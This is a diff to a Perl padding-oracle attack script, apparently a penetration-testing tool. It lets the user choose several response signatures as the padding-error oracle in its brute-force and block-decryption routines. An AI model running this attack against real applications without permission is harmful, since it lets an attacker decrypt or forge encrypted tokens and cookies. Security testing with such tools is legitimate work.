@@ -191,9 +191,8 @@ my $ivBytes = substr($encryptedBytes, 0, $blockSize);
 
 # Declare some optional elements for storing the results of the first test iteration
 # to help the user if they don't know what the padding error looks like
-my @oracleCantidates;
-my $oracleSignature = "";
 my %oracleGuesses;
+my @oracleSignatures = ();
 my %responseFileBuffer;
 
 # The block count should be the sample divided by the blocksize
@@ -275,7 +274,7 @@ if ($bruteForce)
 		   my $signatureData = "$status\t$contentLength\t$location";
 		   $useBody ? ($signatureData = "$status\t$contentLength\t$location\t$content") : "" ;
 
-		   if ($oracleSignature eq "")
+		   if ($#oracleSignatures < 0)
 		   {
 			$b == 0 ? myPrint("[+] Starting response analysis...\n",0) : "";
 			$oracleGuesses{$signatureData}++;
@@ -291,7 +290,7 @@ if ($bruteForce)
 				$bfAttempts = 0;
 			}
 		   }
-		   if ($oracleSignature ne "" && $oracleSignature ne $signatureData)
+		   if ($#oracleSignatures >= 0 && !grep {$signatureData eq $_} @oracleSignatures)
 		   {
 			myPrint("\nAttempt $bfAttempts - Status: $status - Content Length: $contentLength\n$testUrl\n",0);
 			writeFile("Brute_Force_Attempt_".$bfAttempts.".txt", "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content");
@@ -462,9 +461,11 @@ sub determineSignature()
 	} 
 	else 
 	{
-		my $responseNum = &promptUser("\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended");
-		myPrint("\nContinuing test with selection $responseNum\n",0);
-		$oracleSignature = @sortedGuesses[$responseNum-1];
+		my @oracleNums = split(/[,\s]+/, &promptUser("\nEnter a comma separated list of IDs that match the error condition\nNOTE: The ID# marked with ** is recommended"));
+		for (@oracleNums) {
+			push(@oracleSignatures, @sortedGuesses[$_-1]);
+		}
+		myPrint("\nContinuing test with selection [@oracleNums]\n",0);
 	}
 }
 
@@ -517,7 +518,7 @@ sub processBlock
   	my ($sampleBytes) = @_; 
   	
   	# Analysis mode is either 0 (response analysis) or 1 (exploit)  	
-  	(!$error && $oracleSignature eq "") ? my $analysisMode = 0 : my $analysisMode = 1;
+  	(!$error && $#oracleSignatures < 0) ? my $analysisMode = 0 : my $analysisMode = 1;
   	
   	# The return value of this subroutine is the intermediate text for the block
 	my $returnValue;
@@ -595,7 +596,7 @@ sub processBlock
 
 				my $continue = "y";
 
-				if (($error && $content !~ /$error/) || ($oracleSignature ne "" && $oracleSignature ne $signatureData))
+				if (($error && $content !~ /$error/) || ($#oracleSignatures >= 0 && !grep {$signatureData eq $_} @oracleSignatures))
 				{
 					# This is for autoretry logic (only works on the first byte)
 					if ($autoRetry > 0 &&  ($byteNum == ($blockSize - 1) ) && $hasHit == 0 )
